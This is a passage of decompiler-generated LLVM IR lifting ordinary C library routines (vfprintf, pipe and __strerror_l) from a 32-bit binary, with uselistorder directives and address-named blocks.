  uselistorder label %dec_label_pc_8052ba0, { 1, 0 }
  uselistorder label %dec_label_pc_8052b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8052b52.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052b0b, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %dec_label_pc_8052af3, { 1, 0 }
  uselistorder label %dec_label_pc_8052adc, { 1, 0 }
  uselistorder label %dec_label_pc_8052a3e, { 1, 0 }
  uselistorder label %dec_label_pc_8052a0c, { 1, 0 }
  uselistorder label %dec_label_pc_80529e8, { 1, 0 }
  uselistorder label %dec_label_pc_80529be, { 1, 0 }
  uselistorder label %dec_label_pc_8052908, { 1, 0 }
  uselistorder label %dec_label_pc_80528fb, { 1, 0 }
  uselistorder label %dec_label_pc_80528be, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80528ba, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80527db, { 1, 0 }
  uselistorder label %dec_label_pc_80527a2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805279b, { 1, 0 }
  uselistorder label %dec_label_pc_8052720, { 1, 0 }
  uselistorder label %dec_label_pc_80526d8, { 1, 0 }
  uselistorder label %dec_label_pc_805263f, { 1, 0 }
  uselistorder label %dec_label_pc_80525f6, { 1, 0 }
  uselistorder label %dec_label_pc_805259e, { 1, 0 }
  uselistorder label %dec_label_pc_8052573, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052505, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80524a9, { 1, 0 }
  uselistorder label %dec_label_pc_8052488, { 1, 0 }
  uselistorder label %dec_label_pc_805244c, { 1, 0 }
  uselistorder label %dec_label_pc_8052427, { 1, 0 }
  uselistorder label %dec_label_pc_80523cb, { 1, 0 }
  uselistorder label %dec_label_pc_80523ae, { 1, 0 }
  uselistorder label %dec_label_pc_8052385, { 1, 0 }
  uselistorder label %dec_label_pc_8052376, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805235a, { 1, 0 }
  uselistorder label %dec_label_pc_805234a, { 1, 0 }
  uselistorder label %dec_label_pc_8052340, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80522d7, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80522a5, { 1, 0 }
  uselistorder label %dec_label_pc_805223a, { 1, 0 }
  uselistorder label %dec_label_pc_805221c, { 1, 0 }
  uselistorder label %dec_label_pc_805220f, { 1, 0 }
  uselistorder label %dec_label_pc_8052162, { 1, 0 }
  uselistorder label %dec_label_pc_8052150, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052122, { 1, 0 }
  uselistorder label %dec_label_pc_805207c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805205b, { 1, 0 }
  uselistorder label %dec_label_pc_8052030, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051f99, { 1, 0 }
  uselistorder label %dec_label_pc_8051f92, { 1, 0 }
  uselistorder label %dec_label_pc_8051f67, { 1, 0 }
  uselistorder label %dec_label_pc_8051f0d, { 1, 0 }
  uselistorder label %bb233, { 1, 0 }
  uselistorder label %dec_label_pc_8051eee, { 1, 0 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_8051ecf, { 1, 0 }
  uselistorder label %dec_label_pc_8051ec5, { 1, 0 }
  uselistorder label %dec_label_pc_8051e8b, { 1, 0 }
  uselistorder label %dec_label_pc_8051e61, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e50, { 1, 0 }
  uselistorder label %dec_label_pc_8051e28, { 2, 1, 0 }
}

define i32 @vfprintf(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-260 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053406 = load i32, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 %tmp8, i32* @ebx, align 4
  %v2_805341f = ptrtoint i32* %stack_var_-60 to i32
  %tmp23 = bitcast i32* %stack_var_-60 to i8*
  %v5_8053426 = call i8* @_memset(i8* %tmp23, i32 0, i32 10)
  store i32 %arg3, i32* %stack_var_-20, align 4
  %v2_805343f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805343f, i32* @ecx, align 4
  %v2_8053447 = ptrtoint i32* %stack_var_-260 to i32
  store i32 0, i32* @eax, align 4
  %v4_8053455 = call i32 @printf_core(i32 %v2_8053447, i32 %v2_805341f, i32 %arg3, i32 %arg3)
  store i32 %v4_8053455, i32* %eax.global-to-local, align 4
  %v2_805345d = icmp slt i32 %v4_8053455, 0
  br i1 %v2_805345d, label %dec_label_pc_8053543, label %dec_label_pc_8053465

dec_label_pc_8053465:                             ; preds = %entry
  %v0_8053465 = load i32, i32* @ebx, align 4
  %v1_8053465 = add i32 %v0_8053465, 76
  %v2_8053465 = inttoptr i32 %v1_8053465 to i32*
  %v3_8053465 = load i32, i32* %v2_8053465, align 4
  store i32 %v3_8053465, i32* %eax.global-to-local, align 4
  %v2_8053470 = icmp slt i32 %v3_8053465, 0
  br i1 %v2_8053470, label %dec_label_pc_8053484, label %dec_label_pc_8053474

dec_label_pc_8053474:                             ; preds = %dec_label_pc_8053465
  %v1_8053478 = call i32 @__lockfile(i32 %v0_8053465)
  store i32 %v1_8053478, i32* %eax.global-to-local, align 4
  %v0_8053484.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053484

dec_label_pc_8053484:                             ; preds = %dec_label_pc_8053465, %dec_label_pc_8053474
  %v1_8053491 = phi i32 [ %v0_8053465, %dec_label_pc_8053465 ], [ %v0_8053484.pre, %dec_label_pc_8053474 ]
  %stack_var_-276.0 = phi i32 [ 0, %dec_label_pc_8053465 ], [ %v1_8053478, %dec_label_pc_8053474 ]
  %v1_8053484 = add i32 %v1_8053491, 74
  %v2_8053484 = inttoptr i32 %v1_8053484 to i8*
  %v3_8053484 = load i8, i8* %v2_8053484, align 1
  %v1_8053488 = inttoptr i32 %v1_8053491 to i32*
  %tmp24 = icmp slt i8 %v3_8053484, 1
  %tmp25 = icmp eq i1 %tmp24, false
  br i1 %tmp25, label %dec_label_pc_8053493, label %dec_label_pc_805348c

dec_label_pc_805348c:                             ; preds = %dec_label_pc_8053484
  %v2_8053488 = load i32, i32* %v1_8053488, align 4
  %v1_805348e = and i32 %v2_8053488, -33
  store i32 %v1_805348e, i32* %eax.global-to-local, align 4
  store i32 %v1_805348e, i32* %v1_8053488, align 4
  %v0_8053495.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053493

dec_label_pc_8053493:                             ; preds = %dec_label_pc_8053484, %dec_label_pc_805348c
  %v0_80534a2 = phi i32 [ %v1_8053491, %dec_label_pc_8053484 ], [ %v0_8053495.pre, %dec_label_pc_805348c ]
  store i32 0, i32* @ebp, align 4
  %v1_8053495 = add i32 %v0_80534a2, 48
  %v2_8053495 = inttoptr i32 %v1_8053495 to i32*
  %v3_8053495 = load i32, i32* %v2_8053495, align 4
  %v4_8053495 = icmp eq i32 %v3_8053495, 0
  %v1_8053499 = icmp eq i1 %v4_8053495, false
  br i1 %v1_8053499, label %dec_label_pc_80534bf, label %dec_label_pc_805349b

dec_label_pc_805349b:                             ; preds = %dec_label_pc_8053493
  %v2_805349b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805349b, i32* %eax.global-to-local, align 4
  %v1_80534a2 = add i32 %v0_80534a2, 44
  %v2_80534a2 = inttoptr i32 %v1_80534a2 to i32*
  %v3_80534a2 = load i32, i32* %v2_80534a2, align 4
  store i32 %v3_80534a2, i32* @ebp, align 4
  %v2_80534a5 = add i32 %v0_80534a2, 28
  %v3_80534a5 = inttoptr i32 %v2_80534a5 to i32*
  store i32 %v2_805349b, i32* %v3_80534a5, align 4
  %v1_80534a8 = load i32, i32* @ebx, align 4
  %v2_80534a8 = add i32 %v1_80534a8, 44
  %v3_80534a8 = inttoptr i32 %v2_80534a8 to i32*
  store i32 %v2_805349b, i32* %v3_80534a8, align 4
  %v1_80534ab = load i32, i32* @ebx, align 4
  %v2_80534ab = add i32 %v1_80534ab, 20
  %v3_80534ab = inttoptr i32 %v2_80534ab to i32*
  store i32 %v2_805349b, i32* %v3_80534ab, align 4
  store i32 %v2_805341f, i32* %eax.global-to-local, align 4
  %v0_80534b5 = load i32, i32* @ebx, align 4
  %v1_80534b5 = add i32 %v0_80534b5, 48
  %v2_80534b5 = inttoptr i32 %v1_80534b5 to i32*
  store i32 80, i32* %v2_80534b5, align 4
  %v1_80534bc = load i32, i32* @ebx, align 4
  %v2_80534bc = add i32 %v1_80534bc, 16
  %v3_80534bc = inttoptr i32 %v2_80534bc to i32*
  store i32 %v2_805341f, i32* %v3_80534bc, align 4
  %v0_80534dc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80534bf

dec_label_pc_80534bf:                             ; preds = %dec_label_pc_8053493, %dec_label_pc_805349b
  %v0_80534dc = phi i32 [ %v0_80534a2, %dec_label_pc_8053493 ], [ %v0_80534dc.pre, %dec_label_pc_805349b ]
  %v0_80534bf = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_805343f, i32* @ecx, align 4
  store i32 %v0_80534dc, i32* @eax, align 4
  %v4_80534de = call i32 @printf_core(i32 %v2_8053447, i32 %v2_805341f, i32 %v0_80534bf, i32 %v0_80534bf)
  store i32 %v4_80534de, i32* %eax.global-to-local, align 4
  %v0_80534e6 = load i32, i32* @ebp, align 4
  %v1_80534e6 = icmp eq i32 %v0_80534e6, 0
  store i32 %v4_80534de, i32* @esi, align 4
  br i1 %v1_80534e6, label %dec_label_pc_8053520, label %dec_label_pc_80534ec

dec_label_pc_80534ec:                             ; preds = %dec_label_pc_80534bf
  %v0_80534f1 = load i32, i32* @ebx, align 4
  %v5_80534f2 = add i32 %v0_80534f1, 36
  %v6_80534f2 = inttoptr i32 %v5_80534f2 to i32*
  %v7_80534f2 = load i32, i32* %v6_80534f2, align 4
  call void @__pseudo_call(i32 %v7_80534f2)
  %v0_80534f8 = load i32, i32* @ebx, align 4
  %v1_80534f8 = add i32 %v0_80534f8, 20
  %v2_80534f8 = inttoptr i32 %v1_80534f8 to i32*
  %v3_80534f8 = load i32, i32* %v2_80534f8, align 4
  %v4_80534f8 = icmp eq i32 %v3_80534f8, 0
  %v1_80534fc = icmp eq i1 %v4_80534f8, false
  br i1 %v1_80534fc, label %dec_label_pc_8053501, label %dec_label_pc_80534fe

dec_label_pc_80534fe:                             ; preds = %dec_label_pc_80534ec
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_8053501

dec_label_pc_8053501:                             ; preds = %dec_label_pc_80534ec, %dec_label_pc_80534fe
  %v0_8053501 = load i32, i32* @ebp, align 4
  %v2_8053501 = add i32 %v0_80534f8, 44
  %v3_8053501 = inttoptr i32 %v2_8053501 to i32*
  store i32 %v0_8053501, i32* %v3_8053501, align 4
  %v0_8053504 = load i32, i32* @ebx, align 4
  %v1_8053504 = add i32 %v0_8053504, 48
  %v2_8053504 = inttoptr i32 %v1_8053504 to i32*
  store i32 0, i32* %v2_8053504, align 4
  %v0_805350b = load i32, i32* @ebx, align 4
  %v1_805350b = add i32 %v0_805350b, 16
  %v2_805350b = inttoptr i32 %v1_805350b to i32*
  store i32 0, i32* %v2_805350b, align 4
  %v0_8053512 = load i32, i32* @ebx, align 4
  %v1_8053512 = add i32 %v0_8053512, 28
  %v2_8053512 = inttoptr i32 %v1_8053512 to i32*
  store i32 0, i32* %v2_8053512, align 4
  %v0_8053519 = load i32, i32* @ebx, align 4
  %v1_8053519 = add i32 %v0_8053519, 20
  %v2_8053519 = inttoptr i32 %v1_8053519 to i32*
  store i32 0, i32* %v2_8053519, align 4
  br label %dec_label_pc_8053520

dec_label_pc_8053520:                             ; preds = %dec_label_pc_80534bf, %dec_label_pc_8053501
  %v0_8053520 = load i32, i32* @ebx, align 4
  %v1_8053520 = inttoptr i32 %v0_8053520 to i32*
  %v2_8053520 = load i32, i32* %v1_8053520, align 4
  store i32 %v2_8053520, i32* %eax.global-to-local, align 4
  %v2_8053522 = and i32 %v2_8053520, 32
  %v3_8053522 = icmp eq i32 %v2_8053522, 0
  br i1 %v3_8053522, label %dec_label_pc_8053529, label %dec_label_pc_8053526

dec_label_pc_8053526:                             ; preds = %dec_label_pc_8053520
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_8053529

dec_label_pc_8053529:                             ; preds = %dec_label_pc_8053520, %dec_label_pc_8053526
  %v0_8053529 = load i32, i32* @edi, align 4
  %v1_8053529 = and i32 %v0_8053529, 32
  %v2_805352c = or i32 %v1_8053529, %v2_8053520
  store i32 %v2_805352c, i32* @edi, align 4
  store i32 %v2_805352c, i32* %v1_8053520, align 4
  %v4_8053530 = icmp eq i32 %stack_var_-276.0, 0
  br i1 %v4_8053530, label %dec_label_pc_8053543, label %dec_label_pc_8053537

dec_label_pc_8053537:                             ; preds = %dec_label_pc_8053529
  %v0_805353a = load i32, i32* @ebx, align 4
  %v1_805353b = call i32 @__unlockfile(i32 %v0_805353a)
  store i32 %v1_805353b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053543

dec_label_pc_8053543:                             ; preds = %dec_label_pc_8053529, %entry, %dec_label_pc_8053537
  %v0_8053549 = load i32, i32* @esi, align 4
  store i32 %v0_8053549, i32* %eax.global-to-local, align 4
  %v2_805354b = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_805354b, i32* @ebx, align 4
  store i32 %v0_8053406, i32* @ebp, align 4
  ret i32 %v0_8053549

; uselistorder directives
  uselistorder i32 %v0_80534a2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8053447, { 1, 0 }
  uselistorder i32 %v2_805341f, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11 }
  uselistorder i32 (i32)* @__unlockfile, { 0, 7, 2, 1, 5, 4, 6, 3 }
  uselistorder i32 36, { 24, 1, 25, 8, 4, 9, 10, 11, 5, 12, 13, 14, 6, 7, 26, 27, 28, 29, 32, 17, 33, 15, 18, 3, 30, 31, 16, 19, 20, 0, 21, 22, 23, 2 }
  uselistorder i32* @esi, { 343, 344, 345, 346, 347, 7, 60, 348, 349, 355, 33, 34, 11, 35, 36, 39, 37, 38, 12, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 31, 57, 58, 59, 61, 62, 63, 0, 64, 69, 70, 65, 66, 2, 67, 68, 1, 71, 72, 364, 365, 350, 352, 351, 8, 353, 354, 73, 74, 75, 76, 77, 151, 154, 155, 156, 157, 158, 159, 152, 153, 160, 161, 162, 163, 164, 165, 13, 166, 167, 376, 377, 98, 99, 100, 101, 102, 103, 104, 78, 79, 366, 367, 368, 369, 370, 371, 117, 118, 119, 14, 120, 121, 122, 123, 124, 125, 126, 127, 80, 15, 81, 82, 83, 378, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 191, 178, 179, 180, 181, 3, 182, 183, 184, 185, 16, 186, 188, 187, 189, 17, 190, 9, 10, 192, 193, 194, 195, 379, 380, 196, 372, 373, 374, 375, 105, 106, 107, 108, 109, 110, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 18, 224, 225, 212, 213, 214, 215, 222, 223, 216, 217, 218, 219, 220, 221, 111, 112, 19, 113, 114, 356, 357, 358, 359, 360, 20, 361, 21, 362, 363, 128, 129, 130, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 131, 132, 133, 134, 135, 136, 115, 22, 116, 137, 138, 139, 140, 381, 382, 383, 384, 385, 145, 146, 147, 85, 386, 387, 388, 389, 148, 149, 150, 239, 237, 238, 23, 240, 241, 242, 243, 24, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 4, 257, 258, 259, 260, 32, 261, 266, 25, 267, 5, 268, 269, 270, 6, 271, 272, 273, 274, 275, 276, 26, 277, 278, 279, 280, 281, 262, 263, 264, 265, 84, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 27, 319, 341, 342, 320, 300, 301, 86, 87, 28, 88, 89, 90, 91, 92, 93, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 29, 317, 318, 321, 322, 323, 336, 337, 338, 339, 340, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 30, 94, 95, 96, 97, 390, 141, 142, 143, 144 }
  uselistorder i32 16, { 97, 98, 44, 45, 46, 47, 48, 49, 4, 5, 6, 7, 8, 99, 66, 67, 9, 27, 68, 38, 50, 100, 52, 53, 51, 32, 28, 69, 70, 0, 103, 104, 10, 11, 71, 101, 102, 65, 12, 54, 72, 73, 25, 74, 24, 75, 76, 23, 77, 26, 78, 79, 39, 80, 81, 82, 83, 89, 84, 85, 86, 87, 88, 42, 33, 1, 90, 91, 22, 92, 36, 93, 13, 14, 15, 94, 95, 16, 17, 18, 37, 19, 20, 21, 55, 56, 2, 57, 60, 40, 41, 58, 59, 61, 3, 62, 63, 29, 30, 31, 64, 34, 43, 35, 96 }
  uselistorder i32 80, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 28, { 54, 55, 30, 8, 31, 32, 29, 18, 40, 57, 56, 34, 35, 36, 33, 41, 58, 59, 60, 37, 38, 39, 3, 42, 43, 44, 45, 2, 46, 47, 9, 48, 0, 1, 20, 49, 28, 19, 50, 51, 52, 21, 11, 26, 22, 10, 23, 4, 24, 5, 25, 27, 12, 13, 14, 15, 16, 17, 6, 7, 53 }
  uselistorder i32 44, { 29, 30, 31, 0, 5, 6, 2, 7, 8, 3, 9, 10, 4, 11, 12, 13, 16, 14, 15, 17, 18, 32, 33, 34, 35, 23, 24, 36, 37, 19, 20, 22, 25, 21, 26, 1, 27, 28 }
  uselistorder i32 48, { 22, 23, 24, 1, 25, 26, 27, 7, 8, 9, 3, 10, 11, 4, 5, 28, 29, 30, 31, 32, 33, 2, 12, 18, 34, 13, 17, 0, 14, 15, 16, 19, 20, 21, 6 }
  uselistorder i32* @ebp, { 240, 241, 242, 243, 244, 245, 43, 246, 247, 248, 249, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 4, 30, 5, 31, 32, 33, 1, 34, 35, 36, 37, 38, 39, 40, 2, 41, 42, 250, 251, 252, 253, 83, 84, 9, 10, 85, 86, 87, 88, 89, 90, 91, 6, 7, 92, 18, 8, 93, 94, 95, 96, 97, 98, 99, 256, 44, 45, 46, 47, 48, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 12, 115, 116, 11, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 13, 14, 128, 257, 258, 129, 130, 131, 132, 133, 134, 135, 136, 137, 15, 146, 138, 139, 140, 141, 142, 143, 144, 145, 57, 58, 254, 255, 77, 78, 79, 80, 81, 82, 259, 260, 261, 147, 148, 151, 152, 149, 150, 3, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 172, 171, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 238, 239, 197, 198, 49, 50, 51, 52, 53, 54, 55, 56, 199, 200, 201, 202, 203, 204, 205, 206, 16, 207, 0, 208, 209, 210, 211, 212, 213, 214, 215, 216, 225, 226, 233, 234, 235, 236, 237, 217, 218, 219, 220, 221, 222, 223, 224, 227, 228, 229, 230, 231, 232, 264, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 17, 73, 74, 75, 76, 262, 263 }
  uselistorder i8 1, { 2, 0, 1, 3 }
  uselistorder i32 74, { 3, 0, 4, 1, 2 }
  uselistorder i32 (i32)* @__lockfile, { 1, 0, 7, 2, 5, 4, 6, 3 }
  uselistorder i32 76, { 16, 0, 1, 2, 3, 17, 14, 15, 6, 10, 11, 4, 12, 7, 8, 5, 9, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @printf_core, { 1, 0 }
  uselistorder i32 10, { 43, 0, 21, 40, 17, 22, 52, 39, 18, 23, 53, 24, 38, 19, 25, 37, 20, 26, 54, 65, 66, 1, 32, 33, 55, 2, 27, 34, 57, 45, 3, 58, 5, 28, 4, 46, 6, 7, 8, 29, 41, 9, 10, 59, 60, 35, 61, 62, 63, 47, 48, 12, 49, 64, 11, 30, 13, 50, 51, 14, 15, 56, 31, 16, 42, 44, 36 }
  uselistorder label %dec_label_pc_8053543, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053529, { 1, 0 }
  uselistorder label %dec_label_pc_8053520, { 1, 0 }
  uselistorder label %dec_label_pc_8053501, { 1, 0 }
  uselistorder label %dec_label_pc_80534bf, { 1, 0 }
  uselistorder label %dec_label_pc_8053493, { 1, 0 }
  uselistorder label %dec_label_pc_8053484, { 1, 0 }
}

define i32 @pipe(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  store i32 42, i32* @eax, align 4
  %v1_8053559 = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  %v1_8053562 = call i32 @__syscall_ret(i32 %v1_8053559)
  ret i32 %v1_8053562

; uselistorder directives
  uselistorder i32 (i32)* @__syscall_ret, { 22, 32, 26, 25, 24, 12, 13, 27, 19, 23, 16, 11, 10, 31, 9, 0, 34, 33, 30, 21, 15, 8, 7, 6, 5, 4, 18, 2, 3, 17, 29, 20, 1, 28, 14 }
  uselistorder i32 (i32)* @__vsyscall, { 8, 56, 61, 13, 12, 11, 10, 9, 55, 18, 17, 73, 72, 71, 70, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 59, 58, 57, 1, 0, 78, 76, 77, 83, 82, 4, 15, 14, 69, 68, 67, 66, 65, 54, 53, 52, 51, 50, 6, 5, 75, 64, 63, 80, 62, 49, 48, 47, 46, 45, 81, 74, 44, 35, 79, 34, 60, 43, 42, 41, 40, 39, 38, 37, 36, 33, 32, 31, 30, 29, 28, 20, 19, 27, 26, 25, 16, 24, 23, 22, 21, 7, 3, 2 }
  uselistorder i32* @eax, { 242, 222, 241, 59, 223, 224, 225, 226, 227, 228, 232, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 57, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 60, 234, 235, 237, 239, 240, 229, 230, 231, 238, 236, 61, 233, 120, 243, 244, 246, 245, 78, 121, 249, 250, 251, 252, 253, 79, 220, 221, 102, 103, 104, 105, 62, 63, 4, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 124, 125, 126, 127, 254, 255, 256, 90, 97, 91, 99, 74, 75, 128, 5, 257, 129, 130, 6, 247, 248, 106, 107, 123, 132, 80, 131, 133, 134, 135, 136, 137, 138, 139, 140, 141, 143, 144, 151, 153, 157, 1, 145, 146, 147, 149, 150, 155, 156, 154, 152, 142, 148, 108, 109, 110, 158, 159, 24, 111, 25, 112, 7, 81, 82, 83, 160, 161, 260, 261, 98, 113, 114, 84, 27, 115, 116, 8, 162, 163, 164, 165, 166, 167, 168, 76, 170, 177, 171, 172, 174, 176, 0, 179, 180, 182, 175, 77, 178, 181, 173, 101, 26, 169, 196, 12, 85, 183, 184, 13, 197, 122, 86, 87, 88, 14, 89, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 198, 199, 200, 201, 202, 203, 204, 210, 216, 217, 218, 2, 205, 206, 207, 208, 209, 211, 212, 213, 214, 215, 258, 259, 262, 28, 9, 263, 264, 29, 10, 11, 92, 15, 17, 18, 16, 19, 20, 93, 94, 95, 96, 21, 100, 22, 23, 117, 118, 119, 219, 265, 3 }
  uselistorder i32 42, { 1, 0 }
}

define i32 @__strerror_l(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805357621 = load i8, i8* bitcast (i8** @global_var_8054a64.408 to i8*), align 4
  %v4_805357c25 = icmp eq i8 %v3_805357621, 0
  br i1 %v4_805357c25, label %dec_label_pc_8053598, label %dec_label_pc_8053580

dec_label_pc_8053575:                             ; preds = %dec_label_pc_8053580
  %v1_8053575 = add i32 %v0_805359d227, 1
  %v1_8053576 = add i32 %v0_805359d227, add (i32 ptrtoint (i8** @global_var_8054a64.408 to i32), i32 1)
  %v2_8053576 = inttoptr i32 %v1_8053576 to i8*
  %v3_8053576 = load i8, i8* %v2_8053576, align 1
  %v4_805357c = icmp eq i8 %v3_8053576, 0
  br i1 %v4_805357c, label %dec_label_pc_8053598, label %dec_label_pc_8053580

dec_label_pc_8053580:                             ; preds = %entry, %dec_label_pc_8053575
  %v4_805357628.in = phi i8 [ %v3_8053576, %dec_label_pc_8053575 ], [ %v3_805357621, %entry ]
  %v0_805359d227 = phi i32 [ %v1_8053575, %dec_label_pc_8053575 ], [ 0, %entry ]
  %v4_805357628 = zext i8 %v4_805357628.in to i32
  %v12_8053583 = icmp eq i32 %v4_805357628, %arg1
  %v1_8053585 = icmp eq i1 %v12_8053583, false
  br i1 %v1_8053585, label %dec_label_pc_8053575, label %dec_label_pc_8053598

dec_label_pc_805358b:                             ; preds = %dec_label_pc_805358b.preheader, %dec_label_pc_805358b
  %v0_805358e = phi i32 [ %v0_805358b14, %dec_label_pc_805358b.preheader ], [ %v1_805358e, %dec_label_pc_805358b ]
  %v1_805358b = inttoptr i32 %v0_805358e to i8*
  %v2_805358b = load i8, i8* %v1_805358b, align 1
  %v3_805358b = icmp eq i8 %v2_805358b, 0
  %v1_805358e = add i32 %v0_805358e, 1
  %v1_8053591 = icmp eq i1 %v3_805358b, false
  br i1 %v1_8053591, label %dec_label_pc_805358b, label %dec_label_pc_8053593

dec_label_pc_8053593:                             ; preds = %dec_label_pc_805358b
  %v1_8053595 = add i32 %v0_8053595, -1
  %v8_8053595 = icmp eq i32 %v1_8053595, 0
  %v1_805359f = icmp eq i1 %v8_8053595, false
  br i1 %v1_805359f, label %dec_label_pc_805358b.preheader, label %dec_label_pc_80535a1

dec_label_pc_8053598:                             ; preds = %dec_label_pc_8053575, %dec_label_pc_8053580, %entry
  %v0_805359d2.lcssa = phi i32 [ 0, %entry ], [ %v0_805359d227, %dec_label_pc_8053580 ], [ %v1_8053575, %dec_label_pc_8053575 ]
  %v1_805359d3 = icmp eq i32 %v0_805359d2.lcssa, 0
  %v1_805359f10 = icmp eq i1 %v1_805359d3, false
  br i1 %v1_805359f10, label %dec_label_pc_805358b.preheader, label %dec_label_pc_80535a1

dec_label_pc_805358b.preheader:                   ; preds = %dec_label_pc_8053598, %dec_label_pc_8053593
  %v0_8053595 = phi i32 [ %v1_8053595, %dec_label_pc_8053593 ], [ %v0_805359d2.lcssa, %dec_label_pc_8053598 ]
  %v0_805358b14 = phi i32 [ %v1_805358e, %dec_label_pc_8053593 ], [ ptrtoint ([22 x i8]* @global_var_8054abc.409 to i32), %dec_label_pc_8053598 ]
  br label %dec_label_pc_805358b

dec_label_pc_80535a1:                             ; preds = %dec_label_pc_8053593, %dec_label_pc_8053598
  %v0_80535a4 = phi i32 [ ptrtoint ([22 x i8]* @global_var_8054abc.409 to i32), %dec_label_pc_8053598 ], [ %v1_805358e, %dec_label_pc_8053593 ]
  %v1_80535a1 = add i32 %arg2, 20
  %v2_80535a1 = inttoptr i32 %v1_80535a1 to i32*
  %v3_80535a1 = load i32, i32* %v2_80535a1, align 4
  %v3_80535ad = call i32 @__lctrans(i32 %v0_80535a4, i32 %v3_80535a1)
  ret i32 %v3_80535ad

; uselistorder directives
  uselistorder i32 %v0_805359d227, { 0, 2, 1 }
  uselistorder i32 20, { 6, 30, 31, 32, 1, 2, 0, 19, 20, 37, 10, 11, 12, 13, 3, 4, 33, 7, 8, 9, 5, 38, 39, 14, 21, 22, 23, 34, 35, 36, 15, 16, 17, 18, 24, 25, 26, 28, 27, 29 }
  uselistorder i32 ptrtoint ([22 x i8]* @global_var_8054abc.409 to i32), { 1, 0 }
  uselistorder i8 0, { 47, 48, 10, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 170, 173, 11, 174, 172, 94, 95, 96, 93, 101, 58, 0, 1, 59, 60, 61, 62, 63, 3, 4, 64, 65, 2, 5, 66, 67, 68, 97, 98, 99, 100, 179, 180, 181, 175, 91, 43, 44, 45, 46, 102, 103, 25, 26, 104, 49, 9, 50, 51, 52, 53, 105, 6, 106, 107, 69, 70, 71, 108, 109, 7, 111, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 55, 54, 56, 86, 85, 87, 139, 140, 171, 141, 142, 20, 143, 182, 8, 144, 145, 12, 14, 147, 146, 13, 148, 152, 153, 21, 22, 156, 157, 15, 158, 159, 16, 160, 161, 162, 163, 164, 165, 154, 155, 149, 150, 151, 166, 167, 57, 168, 169, 183, 184, 17, 74, 72, 73, 75, 76, 77, 78, 80, 79, 18, 81, 82, 83, 84, 88, 89, 90, 92, 176, 177, 19, 178, 23, 24 }
  uselistorder i8** @global_var_8054a64.408, { 1, 0 }
  uselistorder label %dec_label_pc_80535a1, { 1, 0 }
